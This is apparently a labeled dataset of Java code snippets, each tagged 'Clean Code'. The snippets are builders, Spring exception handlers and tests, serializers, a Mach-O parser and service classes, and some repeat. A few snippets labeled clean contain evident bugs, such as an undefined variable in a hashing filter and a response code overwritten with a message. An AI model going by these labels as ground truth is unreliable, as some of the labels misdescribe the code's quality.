final class Builder {
    private NamespaceID assetId;
    private String translationKey;
    private Builder(){
    }
    @Contract(value=""_ -> this"",pure=true) public @NotNull Builder assetId(    @NotNull NamespaceID assetId){
      this.assetId=assetId;
      return this;
    }
    @Contract(value=""_ -> this"",pure=true) public @NotNull Builder translationKey(    @NotNull String translationKey){
      this.translationKey=translationKey;
      return this;
    }
    @Contract(pure=true) public @NotNull BannerPattern build(){
      return new BannerPatternImpl(assetId,translationKey,null);
    }
  }
}
",0,Clean Code
"/** 
 * Gateway 的全局异常处理器，将 Exception 翻译成 CommonResult + 对应的异常编号 在功能上，和 yudao-spring-boot-starter-web 的 GlobalExceptionHandler 类是一致的
 * @author 芋道源码
 */
@Component @Order(-1) @Slf4j public class GlobalExceptionHandler implements ErrorWebExceptionHandler {
  @Override public Mono<Void> handle(  ServerWebExchange exchange,  Throwable ex){
    ServerHttpResponse response=exchange.getResponse();
    if (response.isCommitted()) {
      return Mono.error(ex);
    }
    CommonResult<?> result;
    if (ex instanceof ResponseStatusException) {
      result=responseStatusExceptionHandler(exchange,(ResponseStatusException)ex);
    }
 else {
      result=defaultExceptionHandler(exchange,ex);
    }
    return WebFrameworkUtils.writeJSON(exchange,result);
  }
  /** 
 * 处理 Spring Cloud Gateway 默认抛出的 ResponseStatusException 异常
 */
  private CommonResult<?> responseStatusExceptionHandler(  ServerWebExchange exchange,  ResponseStatusException ex){
    ServerHttpRequest request=exchange.getRequest();
    log.error(""[responseStatusExceptionHandler][uri({}/{}) 发生异常]"",request.getURI(),request.getMethod(),ex);
    return CommonResult.error(ex.getRawStatusCode(),ex.getReason());
  }
  /** 
 * 处理系统异常，兜底处理所有的一切
 */
  @ExceptionHandler(value=Exception.class) public CommonResult<?> defaultExceptionHandler(  ServerWebExchange exchange,  Throwable ex){
    ServerHttpRequest request=exchange.getRequest();
    log.error(""[defaultExceptionHandler][uri({}/{}) 发生异常]"",request.getURI(),request.getMethod(),ex);
    return CommonResult.error(INTERNAL_SERVER_ERROR.getCode(),INTERNAL_SERVER_ERROR.getMsg());
  }
}
",0,Clean Code
"@SpringBootTest(webEnvironment=WebEnvironment.DEFINED_PORT,properties={""management.endpoints.web.exposure.include=*"",""server.port=52593"",""springdoc.use-management-port=true"",""springdoc.group-configs[0].group=users"",""springdoc.group-configs[0].packages-to-scan=test.org.springdoc.api.v31.app145"",""management.server.port=9300"",""management.endpoints.web.base-path=/application""}) public class SpringDocApp145Test extends AbstractSpringDocActuatorTest {
  @Test void testApp(){
    webTestClient.get().uri(Constants.DEFAULT_API_DOCS_URL + ""/users"").exchange().expectStatus().isNotFound();
  }
  @Test void testApp3() throws Exception {
    try {
      webClient.get().uri(""/application/openapi"" + ""/"" + Constants.DEFAULT_GROUP_NAME).retrieve().bodyToMono(String.class).block();
      fail();
    }
 catch (    WebClientResponseException ex) {
      if (ex.getStatusCode() == HttpStatus.NOT_FOUND)       assertTrue(true);
 else       fail();
    }
  }
@SpringBootApplication static class SpringDocTestApp {
  }
}
@SpringBootTest(webEnvironment=WebEnvironment.DEFINED_PORT,properties={""management.endpoints.web.exposure.include=*"",""server.port=52556"",""springdoc.use-management-port=true"",""springdoc.group-configs[0].group=users"",""springdoc.group-configs[0].packages-to-scan=test.org.springdoc.api.v31.app145"",""management.server.port=9291"",""management.endpoints.web.base-path=/application""}) public class SpringDocApp145Test extends AbstractSpringDocActuatorTest {
  @Test void testApp() throws Exception {
    mockMvc.perform(get(Constants.DEFAULT_API_DOCS_URL + ""/users"")).andExpect(status().isNotFound());
  }
  @Test void testApp1() throws Exception {
    try {
      actuatorRestTemplate.getForObject(""/application/openapi"",String.class);
      fail();
    }
 catch (    HttpClientErrorException ex) {
      if (ex.getStatusCode() == HttpStatus.NOT_FOUND)       assertTrue(true);
 else       fail();
    }
  }
  @Test void testApp2() throws Exception {
    String result=actuatorRestTemplate.getForObject(""/application/openapi/users"",String.class);
    String expected=getContent(""results/3.1.0/app145.json"");
    assertEquals(expected,result,true);
  }
  @Test void testApp3() throws Exception {
    try {
      actuatorRestTemplate.getForObject(""/application/openapi"" + ""/"" + Constants.DEFAULT_GROUP_NAME,String.class);
      fail();
    }
 catch (    HttpStatusCodeException ex) {
      if (ex.getStatusCode() == HttpStatus.NOT_FOUND)       assertTrue(true);
    }
  }
@SpringBootApplication static class SpringDocTestApp {
  }
}
",0,Clean Code
"/** 
 * An encoded value or array. 
 */
public final class EncodedValue implements Comparable<EncodedValue> {
  private final byte[] data;
  public EncodedValue(  byte[] data){
    this.data=data;
  }
  public ByteInput asByteInput(){
    return new ByteArrayByteInput(data);
  }
  public byte[] getBytes(){
    return data;
  }
  public void writeTo(  Dex.Section out){
    out.write(data);
  }
  @Override public int compareTo(  EncodedValue other){
    int size=Math.min(data.length,other.data.length);
    for (int i=0; i < size; i++) {
      if (data[i] != other.data[i]) {
        return (data[i] & 0xff) - (other.data[i] & 0xff);
      }
    }
    return data.length - other.data.length;
  }
  @Override public String toString(){
    return Integer.toHexString(data[0] & 0xff) + ""...("" + data.length+ "")"";
  }
}
",0,Clean Code
"/** 
 * @author : leix.xie
 * @date : 2018/12/28 15:37
 */
public class QmonitorTest {
  static final MetricsReportor reportor=new QMonitorMetricsReportor(Metrics.INSTANCE);
  static final PrintWriter writer=new PrintWriter(System.out);
  public static void premain(  String agentArgs,  Instrumentation inst){
  }
  public static void main(  String[] args){
    startReport();
  }
  public static void startReport(){
    new Thread(new Runnable(){
      @Override public void run(){
        while (true) {
          reportor.report("""");
          writer.println(""------------------"");
          try {
            Thread.sleep(6000);
          }
 catch (          InterruptedException e) {
            e.printStackTrace();
          }
        }
      }
    }
).start();
  }
}
",0,Clean Code
"/** 
 * Can use it as a map key,
 * @author jiachun.fjc
 */
public final class ByteArray implements Comparable<ByteArray>, Serializable {
  private static final long serialVersionUID=3030232535108421145L;
  private final byte[] bytes;
  private int hashCode;
  public static ByteArray wrap(  final byte[] bytes){
    return new ByteArray(bytes);
  }
  ByteArray(  byte[] bytes){
    Requires.requireNonNull(bytes,""bytes"");
    this.bytes=bytes;
    this.hashCode=0;
  }
  public byte[] getBytes(){
    return bytes;
  }
  @Override public boolean equals(  Object o){
    if (this == o)     return true;
    if (o == null || getClass() != o.getClass())     return false;
    ByteArray that=(ByteArray)o;
    return hashCode() == that.hashCode() && Arrays.equals(bytes,that.bytes);
  }
  @Override public int hashCode(){
    if (hashCode == 0) {
      hashCode=Arrays.hashCode(bytes);
    }
    return hashCode;
  }
  @Override public int compareTo(  ByteArray o){
    return BytesUtil.compare(this.bytes,o.bytes);
  }
}",0,Clean Code
"/** 
 * @author AllDataDC
 * @date 2023-01-27
 */
public interface AliPayService {
  /** 
 * 查询配置
 * @return AlipayConfig
 */
  AlipayConfig find();
  /** 
 * 更新配置
 * @param alipayConfig 支付宝配置
 * @return AlipayConfig
 */
  AlipayConfig config(  AlipayConfig alipayConfig);
  /** 
 * 处理来自PC的交易请求
 * @param alipay 支付宝配置
 * @param trade 交易详情
 * @return String
 * @throws Exception 异常
 */
  String toPayAsPc(  AlipayConfig alipay,  TradeVo trade) throws Exception ;
  /** 
 * 处理来自手机网页的交易请求
 * @param alipay 支付宝配置
 * @param trade 交易详情
 * @return String
 * @throws Exception 异常
 */
  String toPayAsWeb(  AlipayConfig alipay,  TradeVo trade) throws Exception ;
}",0,Clean Code
"class ArrayStack {
  private int top=-1;
  private int maxSize;
  private int[] stack;
  public ArrayStack(  int maxSize){
    this.maxSize=maxSize;
    stack=new int[maxSize];
  }
  public boolean isFull(){
    return top == maxSize - 1;
  }
  public boolean isEmpty(){
    return -1 == top;
  }
  public void push(  int value){
    boolean full=this.isFull();
    if (full) {
      System.out.println(""栈满"");
      return;
    }
    top++;
    stack[top]=value;
  }
  public int pop(){
    if (isEmpty()) {
      throw new RuntimeException(""栈空，没有数据~"");
    }
    int value=stack[top];
    top--;
    return value;
  }
  public int peek(){
    return stack[top];
  }
}",0,Clean Code
"public class LogisticModel {
  private double[] sts=null;
  private double a=0.1;
  private List<Map<String,Object>> list=null;
  public LogisticModel(  List<Map<String,Object>> list){
    this.list=list;
    Map<String,Object> map=list.get(0);
    double[] x=(double[])map.get(""x"");
    sts=new double[x.length];
  }
  public LogisticModel(){
  }
  public double function(  double[] xs){
    double re=0f;
    for (int i=0; i < xs.length; i++) {
      re+=xs[i] * sts[i];
    }
    return 1 / (Math.pow(Math.E,-re) + 1);
  }
  /** 
 * @author Administrator
 * @Description 使用梯度下降算法进行函数参数更新（学习）
 * @date 2018年7月16日 下午2:28:09
 */
  public void update(){
    double[] stss=new double[sts.length];
    int len=list.size();
    for (int i=0; i < stss.length; i++) {
      double sum=0f;
      for (      Map<String,Object> map : list) {
        double[] xs=(double[])map.get(""x"");
        double y=(double)map.get(""y"");
        sum+=(function(xs) - y) * xs[i];
      }
      stss[i]=sts[i] - a * (1.0f / len) * sum;
    }
    sts=stss;
  }
  public double dj(){
    double sum=0f;
    for (    Map<String,Object> map : list) {
      double[] xs=(double[])map.get(""x"");
      double y=(double)map.get(""y"");
      sum+=y * Math.log(function(xs)) + (1 - y) * Math.log(1 - function(xs));
    }
    return -(1.0f / list.size()) * sum;
  }
  public void go(){
    int sum=0;
    int count=0;
    while (true) {
      double oldDj=dj();
      sum++;
      if (sum >= 10000) {
        break;
      }
      update();
      double newDj=dj();
      if (Math.abs(newDj - oldDj) < 0.00001) {
        count++;
        if (count > 10) {
          break;
        }
      }
 else {
        count=0;
      }
    }
    System.out.println(""dj:"" + dj() + ""   sum:""+ sum);
  }
  public double[] getSts(){
    return sts;
  }
  public void setSts(  double[] sts){
    this.sts=sts;
  }
  public List<Map<String,Object>> getList(){
    return list;
  }
  public void setList(  List<Map<String,Object>> list){
    this.list=list;
  }
}
",0,Clean Code
"public static class RebaseItem extends KaitaiStruct {
  public static RebaseItem fromFile(  String fileName) throws IOException {
    return new RebaseItem(new ByteBufferKaitaiStream(fileName));
  }
  public RebaseItem(  KaitaiStream _io){
    this(_io,null,null);
  }
  public RebaseItem(  KaitaiStream _io,  MachO.DyldInfoCommand.RebaseData _parent){
    this(_io,_parent,null);
  }
  public RebaseItem(  KaitaiStream _io,  MachO.DyldInfoCommand.RebaseData _parent,  MachO _root){
    super(_io);
    this._parent=_parent;
    this._root=_root;
    _read();
  }
  private void _read(){
    this.opcodeAndImmediate=this._io.readU1();
    if (((opcode() == MachO.DyldInfoCommand.RebaseData.Opcode.SET_SEGMENT_AND_OFFSET_ULEB) || (opcode() == MachO.DyldInfoCommand.RebaseData.Opcode.ADD_ADDRESS_ULEB) || (opcode() == MachO.DyldInfoCommand.RebaseData.Opcode.DO_REBASE_ULEB_TIMES)|| (opcode() == MachO.DyldInfoCommand.RebaseData.Opcode.DO_REBASE_ADD_ADDRESS_ULEB)|| (opcode() == MachO.DyldInfoCommand.RebaseData.Opcode.DO_REBASE_ULEB_TIMES_SKIPPING_ULEB))) {
      this.uleb=new Uleb128(this._io,this,_root);
    }
    if (opcode() == MachO.DyldInfoCommand.RebaseData.Opcode.DO_REBASE_ULEB_TIMES_SKIPPING_ULEB) {
      this.skip=new Uleb128(this._io,this,_root);
    }
  }
  private Opcode opcode;
  public Opcode opcode(){
    if (this.opcode != null)     return this.opcode;
    this.opcode=MachO.DyldInfoCommand.RebaseData.Opcode.byId((opcodeAndImmediate() & 240));
    return this.opcode;
  }
  private Integer immediate;
  public Integer immediate(){
    if (this.immediate != null)     return this.immediate;
    int _tmp=(int)((opcodeAndImmediate() & 15));
    this.immediate=_tmp;
    return this.immediate;
  }
  private int opcodeAndImmediate;
  private Uleb128 uleb;
  private Uleb128 skip;
  private MachO _root;
  private MachO.DyldInfoCommand.RebaseData _parent;
  public int opcodeAndImmediate(){
    return opcodeAndImmediate;
  }
  public Uleb128 uleb(){
    return uleb;
  }
  public Uleb128 skip(){
    return skip;
  }
  public MachO _root(){
    return _root;
  }
  public MachO.DyldInfoCommand.RebaseData _parent(){
    return _parent;
  }
}
",0,Clean Code
"/** 
 * ip 搜索器
 * @author dream.lu
 */
public interface Ip2regionSearcher {
  /** 
 * ip 位置 搜索
 * @param ip ip
 * @return 位置
 */
  @Nullable IpInfo memorySearch(  long ip);
  /** 
 * ip 位置 搜索
 * @param ip ip
 * @return 位置
 */
  @Nullable IpInfo memorySearch(  String ip);
  /** 
 * 读取 ipInfo 中的信息
 * @param ip       ip
 * @param function Function
 * @return 地址
 */
  @Nullable default String getInfo(  long ip,  Function<IpInfo,String> function){
    return IpInfoUtil.readInfo(memorySearch(ip),function);
  }
  /** 
 * 读取 ipInfo 中的信息
 * @param ip       ip
 * @param function Function
 * @return 地址
 */
  @Nullable default String getInfo(  String ip,  Function<IpInfo,String> function){
    return IpInfoUtil.readInfo(memorySearch(ip),function);
  }
  /** 
 * 获取地址信息
 * @param ip ip
 * @return 地址
 */
  @Nullable default String getAddress(  long ip){
    return getInfo(ip,IpInfo::getAddress);
  }
  /** 
 * 获取地址信息
 * @param ip ip
 * @return 地址
 */
  @Nullable default String getAddress(  String ip){
    return getInfo(ip,IpInfo::getAddress);
  }
  /** 
 * 获取地址信息包含 isp
 * @param ip ip
 * @return 地址
 */
  @Nullable default String getAddressAndIsp(  long ip){
    return getInfo(ip,IpInfo::getAddressAndIsp);
  }
  /** 
 * 获取地址信息包含 isp
 * @param ip ip
 * @return 地址
 */
  @Nullable default String getAddressAndIsp(  String ip){
    return getInfo(ip,IpInfo::getAddressAndIsp);
  }
}
",0,Clean Code
"class JacksonMapperTest {
  Pojo pojo(){
    return new Pojo(""te\n\nst"",Instant.parse(""2013-09-08T16:19:12Z""),ZonedDateTime.parse(""2013-09-08T16:19:12+03:00""),null);
  }
  @Test @DefaultTimeZone(""Europe/Athens"") void json() throws IOException {
    ObjectMapper mapper=JacksonMapper.ofJson().copy().setTimeZone(TimeZone.getDefault());
    Pojo original=pojo();
    String s=mapper.writeValueAsString(original);
    Pojo deserialize=mapper.readValue(s,Pojo.class);
    test(original,deserialize);
  }
  @Test @DefaultTimeZone(""Europe/Athens"") void ion() throws IOException {
    ObjectMapper mapper=JacksonMapper.ofIon();
    Pojo original=pojo();
    String s=mapper.writeValueAsString(original);
    assertThat(s,containsString(""nullable:null""));
    Pojo deserialize=mapper.readValue(s,Pojo.class);
    test(original,deserialize);
  }
  @Test void toList() throws JsonProcessingException {
    String list=""[1, 2, 3]"";
    List<Object> integerList=JacksonMapper.toList(list);
    assertThat(integerList.size(),is(3));
    assertThat(integerList,containsInAnyOrder(1,2,3));
  }
  void test(  Pojo original,  Pojo deserialize){
    assertThat(deserialize.getString(),is(original.getString()));
    assertThat(deserialize.getInstant().toEpochMilli(),is(original.getInstant().toEpochMilli()));
    assertThat(deserialize.getInstant().toString(),is(original.getInstant().toString()));
    assertThat(deserialize.getZonedDateTime().toEpochSecond(),is(original.getZonedDateTime().toEpochSecond()));
    assertThat(deserialize.getZonedDateTime().getOffset(),is(original.getZonedDateTime().getOffset()));
  }
@Getter @NoArgsConstructor @AllArgsConstructor public static class Pojo {
    private String string;
    private Instant instant;
    private ZonedDateTime zonedDateTime;
    private String nullable;
  }
}
",0,Clean Code
"/** 
 * 数字序列化
 * @Author 1024创新实验室: 罗伊
 * @Date 2020/8/20 21:04
 * @Wechat zhuoda1024
 * @Email lab1024@163.com
 * @Copyright  <a href=""https://1024lab.net"">1024创新实验室</a>
 */
public class BigDecimalNullZeroSerializer extends JsonSerializer<BigDecimal> {
  @Override public void serialize(  BigDecimal value,  JsonGenerator jsonGenerator,  SerializerProvider serializerProvider) throws IOException {
    if (value == null) {
      jsonGenerator.writeNumber(BigDecimal.ZERO);
      return;
    }
    jsonGenerator.writeNumber(value);
  }
}
/** 
 * 数字序列化
 * @Author 1024创新实验室: 罗伊
 * @Date 2020/8/20 21:04
 * @Wechat zhuoda1024
 * @Email lab1024@163.com
 * @Copyright  <a href=""https://1024lab.net"">1024创新实验室</a>
 */
public class BigDecimalNullZeroSerializer extends JsonSerializer<BigDecimal> {
  @Override public void serialize(  BigDecimal value,  JsonGenerator jsonGenerator,  SerializerProvider serializerProvider) throws IOException {
    if (value == null) {
      jsonGenerator.writeNumber(BigDecimal.ZERO);
      return;
    }
    jsonGenerator.writeNumber(value);
  }
}
",0,Clean Code
"/** 
 * <p> 日志表 服务实现类 </p>
 * @author lengleng
 * @since 2017-11-20
 */
@Service public class SysLogServiceImpl extends ServiceImpl<SysLogMapper,SysLog> implements SysLogService {
  @Override public Page getLogByPage(  Page page,  SysLogDTO sysLog){
    return baseMapper.selectPage(page,buildQuery(sysLog));
  }
  /** 
 * 插入日志
 * @param sysLog 日志对象
 * @return true/false
 */
  @Override @Transactional(rollbackFor=Exception.class) public Boolean saveLog(  SysLog sysLog){
    baseMapper.insert(sysLog);
    return Boolean.TRUE;
  }
  /** 
 * 查询日志列表
 * @param sysLog 查询条件
 * @return List<SysLog>
 */
  @Override public List<SysLog> getList(  SysLogDTO sysLog){
    return baseMapper.selectList(buildQuery(sysLog));
  }
  /** 
 * 构建查询条件
 * @param sysLog 前端条件
 * @return LambdaQueryWrapper
 */
  private LambdaQueryWrapper buildQuery(  SysLogDTO sysLog){
    LambdaQueryWrapper<SysLog> wrapper=Wrappers.lambdaQuery();
    if (StrUtil.isNotBlank(sysLog.getLogType())) {
      wrapper.eq(SysLog::getLogType,sysLog.getLogType());
    }
    if (ArrayUtil.isNotEmpty(sysLog.getCreateTime())) {
      wrapper.ge(SysLog::getCreateTime,sysLog.getCreateTime()[0]).le(SysLog::getCreateTime,sysLog.getCreateTime()[1]);
    }
    return wrapper;
  }
}
",0,Clean Code
"/** 
 * Top-level interface for the Kestra plugins.
 */
public interface Plugin {
  /** 
 * Gets the type of this plugin.
 * @return  the string type of the plugin.
 */
  @NotNull default String getType(){
    return this.getClass().getCanonicalName();
  }
  /** 
 * Static helper method to get the aliases of a given plugin.
 * @param plugin    The plugin type.
 * @return  {@code true} if the plugin is internal.
 */
  static Set<String> getAliases(  final Class<?> plugin){
    io.kestra.core.models.annotations.Plugin annotation=plugin.getAnnotation(io.kestra.core.models.annotations.Plugin.class);
    return Optional.ofNullable(annotation).map(io.kestra.core.models.annotations.Plugin::aliases).stream().flatMap(Arrays::stream).collect(Collectors.toSet());
  }
  /** 
 * Static helper method to check whether a given plugin is internal.
 * @param plugin    The plugin type.
 * @return  {@code true} if the plugin is internal.
 */
  static boolean isInternal(  final Class<?> plugin){
    Objects.requireNonNull(plugin,""Cannot check if a plugin is internal from null"");
    io.kestra.core.models.annotations.Plugin annotation=plugin.getAnnotation(io.kestra.core.models.annotations.Plugin.class);
    return Optional.ofNullable(annotation).map(io.kestra.core.models.annotations.Plugin::internal).orElse(false);
  }
  /** 
 * Static helper method to check whether a given plugin is deprecated.
 * @param plugin    The plugin type.
 * @return  {@code true} if the plugin is deprecated.
 */
  static boolean isDeprecated(  final Class<?> plugin){
    Objects.requireNonNull(plugin,""Cannot check if a plugin is deprecated from null"");
    Deprecated annotation=plugin.getAnnotation(Deprecated.class);
    return annotation != null;
  }
  /** 
 * Static helper method to get the id of a plugin.
 * @param plugin The plugin type.
 * @return an optional string id.
 */
  static Optional<String> getId(  final Class<?> plugin){
    Objects.requireNonNull(plugin,""Cannot get plugin id from null"");
    Id annotation=plugin.getAnnotation(Id.class);
    return Optional.ofNullable(annotation).map(Id::value).map(String::toLowerCase);
  }
}
",0,Clean Code
"public class SpringGlueFactory extends GlueFactory {
  private static Logger logger=LoggerFactory.getLogger(SpringGlueFactory.class);
  /** 
 * inject action of spring
 * @param instance
 */
  @Override public void injectService(  Object instance){
    if (instance == null) {
      return;
    }
    if (JobSpringExecutor.getApplicationContext() == null) {
      return;
    }
    Field[] fields=instance.getClass().getDeclaredFields();
    for (    Field field : fields) {
      if (Modifier.isStatic(field.getModifiers())) {
        continue;
      }
      Object fieldBean=null;
      if (AnnotationUtils.getAnnotation(field,Resource.class) != null) {
        try {
          Resource resource=AnnotationUtils.getAnnotation(field,Resource.class);
          if (resource.name() != null && resource.name().length() > 0) {
            fieldBean=JobSpringExecutor.getApplicationContext().getBean(resource.name());
          }
 else {
            fieldBean=JobSpringExecutor.getApplicationContext().getBean(field.getName());
          }
        }
 catch (        Exception e) {
        }
        if (fieldBean == null) {
          fieldBean=JobSpringExecutor.getApplicationContext().getBean(field.getType());
        }
      }
 else       if (AnnotationUtils.getAnnotation(field,Autowired.class) != null) {
        Qualifier qualifier=AnnotationUtils.getAnnotation(field,Qualifier.class);
        if (qualifier != null && qualifier.value() != null && qualifier.value().length() > 0) {
          fieldBean=JobSpringExecutor.getApplicationContext().getBean(qualifier.value());
        }
 else {
          fieldBean=JobSpringExecutor.getApplicationContext().getBean(field.getType());
        }
      }
      if (fieldBean != null) {
        field.setAccessible(true);
        try {
          field.set(instance,fieldBean);
        }
 catch (        IllegalArgumentException e) {
          logger.error(e.getMessage(),e);
        }
catch (        IllegalAccessException e) {
          logger.error(e.getMessage(),e);
        }
      }
    }
  }
}",0,Clean Code
"abstract class ShaBaseFilter implements Filter {
  private final String algorithm;
  ShaBaseFilter(  String algorithm){
    this.algorithm=algorithm;
  }
  @Override public List<String> getArgumentNames(){
    return null;
  }
  @Override public Object apply(  Object input,  Map<String,Object> args,  PebbleTemplate self,  EvaluationContext context,  int lineNumber) throws PebbleException {
    if (input == null) {
      return null;
    }
    if (input instanceof String) {
      try {
        MessageDigest digest=MessageDigest.getInstance(algorithm);
        byte[] encodedHash=digest.digest((str).getBytes(StandardCharsets.UTF_8));
        return bytesToHex(encodedHash);
      }
 catch (      Exception e) {
        throw new PebbleException(e,""Hashing exception encountered\n"",lineNumber,self.getName());
      }
    }
 else {
      throw new PebbleException(null,""Need a string to hash\n"",lineNumber,self.getName());
    }
  }
  private static String bytesToHex(  byte[] bytes){
    StringBuilder hexString=new StringBuilder(2 * bytes.length);
    for (    byte aByte : bytes) {
      String hex=Integer.toHexString(0xff & aByte);
      if (hex.length() == 1) {
        hexString.append('0');
      }
      hexString.append(hex);
    }
    return hexString.toString();
  }
}
",0,Clean Code
"/** 
 * Administrator 2019/9/2 0002 14:45
 */
@Service @Slf4j public class UserVerifyServiceImpl implements IUserVerifyService {
  @Autowired MemberMapper memberMapper;
  @Autowired UserVerifyMapper userVerifyMapper;
  @Override public UserVerifyResponse verifyMemer(  UserVerifyRequest request){
    UserVerifyResponse response=new UserVerifyResponse();
    try {
      request.requestCheck();
      Example example=new Example(Member.class);
      example.createCriteria().andEqualTo(""state"",1).andEqualTo(""username"",request.getUserName());
      List<Member> member=memberMapper.selectByExample(example);
      if (member == null || member.size() == 0) {
        response.setCode(SysRetCodeConstants.USER_INFOR_INVALID.getCode());
        response.setMsg(SysRetCodeConstants.USER_INFOR_INVALID.getMessage());
        return response;
      }
      example.clear();
      example=new Example(UserVerify.class);
      example.createCriteria().andEqualTo(""uuid"",request.getUuid());
      List<UserVerify> userVerifys=userVerifyMapper.selectByExample(example);
      if (userVerifys == null || userVerifys.size() == 0) {
        response.setCode(SysRetCodeConstants.USERVERIFY_INFOR_INVALID.getCode());
        response.setMsg(SysRetCodeConstants.USERVERIFY_INFOR_INVALID.getMessage());
        return response;
      }
      example.clear();
      example.createCriteria().andEqualTo(""uuid"",request.getUuid());
      UserVerify userVerify=userVerifys.get(0);
      userVerify.setIsVerify(""Y"");
      userVerifyMapper.updateByExample(userVerify,example);
      example.clear();
      example=new Example(Member.class);
      Member member_=member.get(0);
      member_.setIsVerified(""Y"");
      memberMapper.updateByExample(member_,example);
      response.setCode(SysRetCodeConstants.SUCCESS.getCode());
      response.setCode(SysRetCodeConstants.SUCCESS.getMessage());
      return response;
    }
 catch (    Exception e) {
      log.error(e.getMessage());
      e.printStackTrace();
      ExceptionProcessorUtils.wrapperHandlerException(response,e);
      return response;
    }
  }
}",0,Clean Code
"@Validated @Controller(""/api/v1/namespaces"") public class NamespaceController implements NamespaceControllerInterface<Namespace,NamespaceWithDisabled> {
  @Inject private TenantService tenantService;
  @Inject private FlowRepositoryInterface flowRepository;
  @Inject private FlowTopologyService flowTopologyService;
  @Inject private NamespaceUtils namespaceUtils;
  @Get(uri=""{id}"") @ExecuteOn(TaskExecutors.IO) @Operation(tags={""Namespaces""},summary=""Get a namespace"") public Namespace index(  @Parameter(description=""The namespace id"") @PathVariable String id){
    return Namespace.builder().id(id).build();
  }
  @Get(uri=""/search"") @ExecuteOn(TaskExecutors.IO) @Operation(tags={""Namespaces""},summary=""Search for namespaces"") public PagedResults<NamespaceWithDisabled> find(  @Parameter(description=""A string filter"") @Nullable @QueryValue(value=""q"") String query,  @Parameter(description=""The current page"") @QueryValue(defaultValue=""1"") @Min(1) int page,  @Parameter(description=""The current page size"") @QueryValue(defaultValue=""10"") @Min(1) int size,  @Parameter(description=""The sort of current page"") @Nullable @QueryValue List<String> sort,  @Parameter(description=""Return only existing namespace"") @Nullable @QueryValue(value=""existing"",defaultValue=""false"") Boolean existingOnly) throws HttpStatusException {
    List<String> distinctNamespaces=flowRepository.findDistinctNamespace(tenantService.resolveTenant()).stream().flatMap(n -> NamespaceUtils.asTree(n).stream()).collect(Collectors.toList());
    if (distinctNamespaces.stream().noneMatch(ns -> namespaceUtils.getSystemFlowNamespace().equals(ns))) {
      distinctNamespaces.add(namespaceUtils.getSystemFlowNamespace());
    }
    distinctNamespaces=distinctNamespaces.stream().sorted().distinct().collect(Collectors.toList());
    if (query != null) {
      distinctNamespaces=distinctNamespaces.stream().filter(s -> s.toLowerCase(Locale.ROOT).contains(query.toLowerCase(Locale.ROOT))).collect(Collectors.toList());
    }
    var total=distinctNamespaces.size();
    Pageable pageable=PageableUtils.from(page,size,sort);
    if (sort != null) {
      Sort.Order.Direction direction=pageable.getSort().getOrderBy().getFirst().getDirection();
      if (direction.equals(Sort.Order.Direction.ASC)) {
        Collections.sort(distinctNamespaces);
      }
 else {
        Collections.reverse(distinctNamespaces);
      }
    }
    if (distinctNamespaces.size() > pageable.getSize()) {
      distinctNamespaces=distinctNamespaces.subList((int)pageable.getOffset() - pageable.getSize(),Math.min((int)pageable.getOffset(),distinctNamespaces.size()));
    }
    return PagedResults.of(new ArrayListTotal<>(distinctNamespaces.stream().<NamespaceWithDisabled>map(s -> NamespaceWithDisabled.builder().id(s).disabled(true).build()).toList(),total));
  }
  @ExecuteOn(TaskExecutors.IO) @Get(uri=""{namespace}/dependencies"") @Operation(tags={""Flows""},summary=""Get flow dependencies"") public FlowTopologyGraph dependencies(  @Parameter(description=""The flow namespace"") @PathVariable String namespace,  @Parameter(description=""if true, list only destination dependencies, otherwise list also source dependencies"") @QueryValue(defaultValue=""false"") boolean destinationOnly){
    return flowTopologyService.namespaceGraph(tenantService.resolveTenant(),namespace);
  }
}
",0,Clean Code
"/** 
 * Instruction format  {@code 10t}. See the instruction format spec for details. 
 */
public final class Form10t extends InsnFormat {
  /** 
 * {@code non-null;} unique instance of this class 
 */
  public static final InsnFormat THE_ONE=new Form10t();
  /** 
 * Constructs an instance. This class is not publicly instantiable. Use  {@link #THE_ONE}. 
 */
  private Form10t(){
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public String insnArgString(  DalvInsn insn){
    return branchString(insn);
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public String insnCommentString(  DalvInsn insn,  boolean noteIndices){
    return branchComment(insn);
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public int codeSize(){
    return 1;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public boolean isCompatible(  DalvInsn insn){
    if (!((insn instanceof TargetInsn) && (insn.getRegisters().size() == 0))) {
      return false;
    }
    TargetInsn ti=(TargetInsn)insn;
    return !ti.hasTargetOffset() || branchFits(ti);
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public boolean branchFits(  TargetInsn insn){
    int offset=insn.getTargetOffset();
    return (offset != 0) && signedFitsInByte(offset);
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public void writeTo(  AnnotatedOutput out,  DalvInsn insn){
    int offset=((TargetInsn)insn).getTargetOffset();
    write(out,opcodeUnit(insn,(offset & 0xff)));
  }
}
",0,Clean Code
"/** 
 * @author enjoyyin
 * @date 2022-03-20
 * @since 1.1.0
 */
public class DSSOrchestratorRelationManager {
  private static final Logger LOGGER=LoggerFactory.getLogger(DSSOrchestratorRelationManager.class);
  private static final List<DSSOrchestratorRelation> dssOrchestratorRelations=ClassUtils.getInstances(DSSOrchestratorRelation.class,c -> c != OrchestratorJsonRelation.class);
static {
    int index=1;
    while (true) {
      String key=""wds.dss.orchestrator.new."" + index + ""th"";
      if (BDPConfiguration.contains(key,false)) {
        String relation=BDPConfiguration.get(key,false);
        OrchestratorJsonRelation jsonRelation=new OrchestratorJsonRelation(relation);
        jsonRelation.init();
        LOGGER.info(""loaded DSSOrchestratorRelation is {}."",relation);
        dssOrchestratorRelations.add(jsonRelation);
      }
 else {
        break;
      }
      index++;
    }
    BiConsumer<Function<DSSOrchestratorRelation,String>,String> getRepeatRelations=(getField,fieldName) -> {
      String repeatRelations=dssOrchestratorRelations.stream().map(getField).collect(Collectors.groupingBy(Function.identity(),Collectors.counting())).entrySet().stream().filter(entry -> entry.getValue() > 1).map(Map.Entry::getKey).collect(Collectors.joining("", ""));
      if (StringUtils.isNotEmpty(repeatRelations)) {
        throw new ExternalOperationWarnException(50035,""repeated DSSOrchestratorRelation in "" + fieldName + "": ""+ repeatRelations);
      }
    }
;
    getRepeatRelations.accept(DSSOrchestratorRelation::getDSSOrchestratorName,""name"");
    getRepeatRelations.accept(DSSOrchestratorRelation::getDSSOrchestratorMode,""mode"");
    LOGGER.info(""The DSSOrchestratorRelation list is {}."",dssOrchestratorRelations.stream().map(DSSOrchestratorRelation::getDSSOrchestratorName).collect(Collectors.joining("", "")));
  }
